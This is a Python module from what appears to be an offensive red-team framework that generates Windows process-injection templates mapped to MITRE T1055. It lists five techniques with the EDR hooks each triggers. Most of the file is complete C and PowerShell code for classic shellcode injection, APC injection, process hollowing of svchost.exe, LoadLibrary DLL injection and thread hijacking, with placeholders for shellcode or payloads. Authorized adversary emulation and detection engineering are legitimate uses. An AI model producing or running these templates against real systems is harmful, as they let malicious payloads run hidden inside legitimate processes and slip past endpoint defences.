"""Process injection technique templates.

Maps to MITRE T1055 -- Process Injection.
"""

from __future__ import annotations

from rich import box
from rich.console import Console
from rich.table import Table

from ghost.logger import info, ok, section, warn
from ghost.models import AttackResult, EngagementContext
from ghost.modules.base import BaseModule
from ghost.utils.artifacts import save_artifact

console = Console()


class ProcessInjectionModule(BaseModule):
    """Process injection technique templates.
    Maps to MITRE T1055 -- Process Injection.
    """

    name = "Process Injection Templates"

    TECHNIQUES = {
        "classic": {
            "name": "Classic DLL/Shellcode Injection",
            "mitre": "T1055.001 / T1055.003",
            "apis": ["OpenProcess", "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"],
            "edr_hooks": ["ntdll!NtWriteVirtualMemory", "ntdll!NtCreateThreadEx",
                          "kernel32!CreateRemoteThread", "ntdll!NtAllocateVirtualMemory"],
            "detection": "High -- every major EDR hooks these APIs in userland ntdll"
        },
        "apc": {
            "name": "APC Injection",
            "mitre": "T1055.004",
            "apis": ["OpenProcess", "VirtualAllocEx", "WriteProcessMemory",
                     "OpenThread", "QueueUserAPC"],
            "edr_hooks": ["ntdll!NtQueueApcThread", "ntdll!NtWriteVirtualMemory"],
            "detection": "Medium -- requires alertable thread state, less commonly monitored"
        },
        "hollowing": {
            "name": "Process Hollowing",
            "mitre": "T1055.012",
            "apis": ["CreateProcess (SUSPENDED)", "NtUnmapViewOfSection",
                     "VirtualAllocEx", "WriteProcessMemory", "SetThreadContext", "ResumeThread"],
            "edr_hooks": ["ntdll!NtUnmapViewOfSection", "ntdll!NtSetContextThread",
                          "ntdll!NtResumeThread"],
            "detection": "High -- suspended process creation is a strong signal"
        },
        "dll_inject": {
            "name": "DLL Injection via LoadLibrary",
            "mitre": "T1055.001",
            "apis": ["OpenProcess", "VirtualAllocEx", "WriteProcessMemory",
                     "GetProcAddress(LoadLibraryA)", "CreateRemoteThread"],
            "edr_hooks": ["ntdll!LdrLoadDll", "kernel32!CreateRemoteThread"],
            "detection": "High -- LoadLibrary from remote thread is a classic indicator"
        },
        "thread_hijack": {
            "name": "Thread Hijacking",
            "mitre": "T1055.003",
            "apis": ["OpenThread", "SuspendThread", "GetThreadContext",
                     "SetThreadContext (RIP/EIP)", "ResumeThread"],
            "edr_hooks": ["ntdll!NtSetContextThread", "ntdll!NtSuspendThread",
                          "ntdll!NtGetContextThread"],
            "detection": "Medium -- no new thread created, but context modification is flagged"
        },
    }

    def run(self, ctx: EngagementContext) -> None:
        section("Module 3 -- Process Injection Templates [T1055]")

        # -- Summary table --
        table = Table(title="Process Injection Techniques", box=box.ROUNDED)
        table.add_column("Technique", style="cyan")
        table.add_column("MITRE", style="dim")
        table.add_column("API Count", justify="center")
        table.add_column("Detection Surface")

        for key, tech in self.TECHNIQUES.items():
            table.add_row(
                tech["name"],
                tech["mitre"],
                str(len(tech["apis"])),
                tech["detection"]
            )
        console.print(table)

        # -- Generate templates --
        for key, tech in self.TECHNIQUES.items():
            info(f"Generating {tech['name']} template...")

            if key == "classic":
                c_code = self._classic_inject_c(ctx)
                ps_code = self._classic_inject_ps(ctx)
                save_artifact(ctx, "inject_classic.c", c_code)
                save_artifact(ctx, "inject_classic.ps1", ps_code)

            elif key == "apc":
                c_code = self._apc_inject_c(ctx)
                save_artifact(ctx, "inject_apc.c", c_code)

            elif key == "hollowing":
                c_code = self._process_hollowing_c(ctx)
                save_artifact(ctx, "inject_hollowing.c", c_code)

            elif key == "dll_inject":
                c_code = self._dll_inject_c(ctx)
                save_artifact(ctx, "inject_dll.c", c_code)

            elif key == "thread_hijack":
                c_code = self._thread_hijack_c(ctx)
                save_artifact(ctx, "inject_thread_hijack.c", c_code)

            ok(f"{tech['name']} -- template generated")

            # -- EDR hook analysis --
            hooks_str = ", ".join(tech["edr_hooks"])
            warn(f"EDR hooks on: {hooks_str}")

        ctx.results.append(AttackResult(
            module="process_injection", action="generate_templates", status="ok",
            severity="critical",
            notes=f"Generated {len(self.TECHNIQUES)} injection technique templates with EDR hook analysis"
        ))

    @staticmethod
    def _classic_inject_c(ctx: EngagementContext) -> str:
        return (
            "// Classic Shellcode Injection -- C\n"
            "// T1055.003 -- OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread\n\n"
            "#include <windows.h>\n#include <stdio.h>\n\n"
            "unsigned char shellcode[] = { /* INSERT SHELLCODE */ };\n\n"
            "int main(int argc, char* argv[]) {\n"
            "    DWORD pid = atoi(argv[1]);\n"
            "    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n"
            "    if (!hProcess) { printf(\"[-] OpenProcess failed\\n\"); return 1; }\n\n"
            "    LPVOID addr = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),\n"
            "                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n"
            "    if (!addr) { printf(\"[-] VirtualAllocEx failed\\n\"); return 1; }\n\n"
            "    WriteProcessMemory(hProcess, addr, shellcode, sizeof(shellcode), NULL);\n\n"
            "    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,\n"
            "                                        (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);\n"
            "    WaitForSingleObject(hThread, INFINITE);\n"
            "    CloseHandle(hThread);\n"
            "    CloseHandle(hProcess);\n"
            "    return 0;\n}\n"
        )

    @staticmethod
    def _classic_inject_ps(ctx: EngagementContext) -> str:
        return (
            "# Classic Shellcode Injection -- PowerShell\n"
            "# Uses Add-Type to call Win32 APIs\n\n"
            "$code = @\"\n"
            "using System;\nusing System.Runtime.InteropServices;\n"
            "public class Win32 {\n"
            "    [DllImport(\"kernel32.dll\")] public static extern IntPtr OpenProcess(int a, bool b, int c);\n"
            "    [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAllocEx(IntPtr a, IntPtr b, uint c, uint d, uint e);\n"
            "    [DllImport(\"kernel32.dll\")] public static extern bool WriteProcessMemory(IntPtr a, IntPtr b, byte[] c, int d, out int e);\n"
            "    [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateRemoteThread(IntPtr a, IntPtr b, uint c, IntPtr d, IntPtr e, uint f, out IntPtr g);\n"
            "}\n\"@\n\n"
            "Add-Type $code\n"
            "$pid = <TARGET_PID>\n"
            "[byte[]]$sc = <SHELLCODE_BYTES>\n"
            "$h = [Win32]::OpenProcess(0x001F0FFF, $false, $pid)\n"
            "$a = [Win32]::VirtualAllocEx($h, [IntPtr]::Zero, [uint32]$sc.Length, 0x3000, 0x40)\n"
            "$o = 0\n"
            "[Win32]::WriteProcessMemory($h, $a, $sc, $sc.Length, [ref]$o)\n"
            "$t = [IntPtr]::Zero\n"
            "[Win32]::CreateRemoteThread($h, [IntPtr]::Zero, 0, $a, [IntPtr]::Zero, 0, [ref]$t)\n"
        )

    @staticmethod
    def _apc_inject_c(ctx: EngagementContext) -> str:
        return (
            "// APC Injection -- C\n"
            "// T1055.004 -- QueueUserAPC to alertable thread\n\n"
            "#include <windows.h>\n#include <tlhelp32.h>\n\n"
            "unsigned char shellcode[] = { /* INSERT SHELLCODE */ };\n\n"
            "DWORD FindAlertableThread(DWORD pid) {\n"
            "    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\n"
            "    THREADENTRY32 te = { sizeof(THREADENTRY32) };\n"
            "    if (Thread32First(snap, &te)) {\n"
            "        do {\n"
            "            if (te.th32OwnerProcessID == pid) {\n"
            "                CloseHandle(snap);\n"
            "                return te.th32ThreadID;\n"
            "            }\n"
            "        } while (Thread32Next(snap, &te));\n"
            "    }\n"
            "    CloseHandle(snap);\n"
            "    return 0;\n}\n\n"
            "int main(int argc, char* argv[]) {\n"
            "    DWORD pid = atoi(argv[1]);\n"
            "    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n"
            "    LPVOID addr = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),\n"
            "                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n"
            "    WriteProcessMemory(hProcess, addr, shellcode, sizeof(shellcode), NULL);\n\n"
            "    DWORD tid = FindAlertableThread(pid);\n"
            "    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);\n"
            "    QueueUserAPC((PAPCFUNC)addr, hThread, 0);\n"
            "    CloseHandle(hThread);\n"
            "    CloseHandle(hProcess);\n"
            "    return 0;\n}\n"
        )

    @staticmethod
    def _process_hollowing_c(ctx: EngagementContext) -> str:
        return (
            "// Process Hollowing -- C\n"
            "// T1055.012 -- CreateProcess(SUSPENDED) -> NtUnmapViewOfSection -> Write -> Resume\n\n"
            "#include <windows.h>\n#include <winternl.h>\n\n"
            "typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);\n\n"
            "unsigned char payload[] = { /* INSERT PE PAYLOAD */ };\n\n"
            "int main() {\n"
            "    STARTUPINFOA si = { sizeof(si) };\n"
            "    PROCESS_INFORMATION pi;\n\n"
            "    // Create suspended process\n"
            "    CreateProcessA(\"C:\\\\Windows\\\\System32\\\\svchost.exe\", NULL, NULL, NULL,\n"
            "                   FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);\n\n"
            "    // Unmap original image\n"
            "    pNtUnmapViewOfSection NtUnmap = (pNtUnmapViewOfSection)\n"
            "        GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtUnmapViewOfSection\");\n"
            "    // Get PEB -> ImageBaseAddress\n"
            "    CONTEXT ctx;\n"
            "    ctx.ContextFlags = CONTEXT_FULL;\n"
            "    GetThreadContext(pi.hThread, &ctx);\n\n"
            "    LPVOID imageBase;\n"
            "#ifdef _WIN64\n"
            "    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &imageBase, sizeof(LPVOID), NULL);\n"
            "#else\n"
            "    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x8), &imageBase, sizeof(LPVOID), NULL);\n"
            "#endif\n"
            "    NtUnmap(pi.hProcess, imageBase);\n\n"
            "    // Write payload and resume\n"
            "    LPVOID addr = VirtualAllocEx(pi.hProcess, imageBase, sizeof(payload),\n"
            "                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n"
            "    WriteProcessMemory(pi.hProcess, addr, payload, sizeof(payload), NULL);\n"
            "    ResumeThread(pi.hThread);\n\n"
            "    CloseHandle(pi.hThread);\n"
            "    CloseHandle(pi.hProcess);\n"
            "    return 0;\n}\n"
        )

    @staticmethod
    def _dll_inject_c(ctx: EngagementContext) -> str:
        return (
            "// DLL Injection via LoadLibrary -- C\n"
            "// T1055.001 -- Write DLL path -> CreateRemoteThread(LoadLibraryA)\n\n"
            "#include <windows.h>\n#include <stdio.h>\n\n"
            "int main(int argc, char* argv[]) {\n"
            "    DWORD pid = atoi(argv[1]);\n"
            "    const char* dllPath = argv[2];  // Full path to malicious DLL\n\n"
            "    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n"
            "    LPVOID addr = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1,\n"
            "                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
            "    WriteProcessMemory(hProcess, addr, dllPath, strlen(dllPath) + 1, NULL);\n\n"
            "    HMODULE hKernel = GetModuleHandleA(\"kernel32.dll\");\n"
            "    FARPROC pLoadLib = GetProcAddress(hKernel, \"LoadLibraryA\");\n\n"
            "    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,\n"
            "                                        (LPTHREAD_START_ROUTINE)pLoadLib, addr, 0, NULL);\n"
            "    WaitForSingleObject(hThread, INFINITE);\n"
            "    CloseHandle(hThread);\n"
            "    CloseHandle(hProcess);\n"
            "    return 0;\n}\n"
        )

    @staticmethod
    def _thread_hijack_c(ctx: EngagementContext) -> str:
        return (
            "// Thread Hijacking -- C\n"
            "// T1055.003 -- SuspendThread -> modify RIP/EIP -> ResumeThread\n\n"
            "#include <windows.h>\n#include <tlhelp32.h>\n\n"
            "unsigned char shellcode[] = { /* INSERT SHELLCODE */ };\n\n"
            "int main(int argc, char* argv[]) {\n"
            "    DWORD pid = atoi(argv[1]);\n"
            "    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n\n"
            "    // Allocate and write shellcode\n"
            "    LPVOID addr = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),\n"
            "                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n"
            "    WriteProcessMemory(hProcess, addr, shellcode, sizeof(shellcode), NULL);\n\n"
            "    // Find and suspend target thread\n"
            "    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\n"
            "    THREADENTRY32 te = { sizeof(THREADENTRY32) };\n"
            "    HANDLE hThread = NULL;\n"
            "    if (Thread32First(snap, &te)) {\n"
            "        do {\n"
            "            if (te.th32OwnerProcessID == pid) {\n"
            "                hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);\n"
            "                break;\n"
            "            }\n"
            "        } while (Thread32Next(snap, &te));\n"
            "    }\n"
            "    CloseHandle(snap);\n\n"
            "    SuspendThread(hThread);\n"
            "    CONTEXT ctx;\n"
            "    ctx.ContextFlags = CONTEXT_FULL;\n"
            "    GetThreadContext(hThread, &ctx);\n\n"
            "#ifdef _WIN64\n"
            "    ctx.Rip = (DWORD64)addr;\n"
            "#else\n"
            "    ctx.Eip = (DWORD)addr;\n"
            "#endif\n\n"
            "    SetThreadContext(hThread, &ctx);\n"
            "    ResumeThread(hThread);\n\n"
            "    CloseHandle(hThread);\n"
            "    CloseHandle(hProcess);\n"
            "    return 0;\n}\n"
        )
